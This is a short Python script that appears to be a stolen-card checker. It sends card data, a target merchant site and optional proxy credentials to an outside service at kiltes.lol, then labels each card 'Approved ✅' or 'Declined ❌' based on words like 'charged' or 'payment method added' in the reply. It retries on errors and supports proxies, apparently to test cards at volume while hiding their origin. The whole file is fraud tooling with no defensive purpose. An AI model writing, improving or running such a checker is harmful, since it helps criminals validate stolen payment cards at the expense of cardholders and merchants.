import httpx, asyncio

MAX_RETRIES = 5
DELAY_BETWEEN_RETRIES = 3  # seconds

async def async_auth_func(card, proxy_raw=None):
    url = "http://kiltes.lol/str/"
    site = "https://www.tekkabazzar.com"

    proxy_url = None
    if proxy_raw:
        try:
            host, port, user, pwd = proxy_raw.split(":")
            proxy_url = f"http://{user}:{pwd}@{host}:{port}"
        except:
            return {"status": "Error ❗", "response": "Invalid proxy format"}

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json"
    }

    params = {
        "cc": card,
        "site": site,
        "proxy": proxy_raw or ""
    }

    for attempt in range(1, MAX_RETRIES + 2):
        try:
            async with httpx.AsyncClient(timeout=25.0, headers=headers, proxy=proxy_url) as client:
                resp = await client.get(url, params=params)
                code = resp.status_code

                try:
                    json_data = resp.json()
                    result_text = json_data.get("result", "").strip()
                except:
                    result_text = resp.text.strip()

                msg_lower = result_text.lower()

                if code == 200:
                    if any(x in msg_lower for x in ["charged", "success", "thank you", "payment method added"]):
                        return {"status": "Approved ✅", "response": result_text}
                    elif any(x in msg_lower for x in ["insufficient", "incorrect", "declined", "invalid"]):
                        return {"status": "Declined ❌", "response": result_text}
                    else:
                        return {"status": "Declined ❌", "response": result_text}
                else:
                    # Retry on server errors
                    if attempt < MAX_RETRIES + 1 and code >= 500:
                        await asyncio.sleep(DELAY_BETWEEN_RETRIES)
                        continue
                    return {"status": "Error ❗", "response": f"HTTP {code}"}

        except Exception:
            if attempt < MAX_RETRIES + 1:
                await asyncio.sleep(DELAY_BETWEEN_RETRIES)
                continue
            return {"status": "Error ❗", "response": "Request failed"}
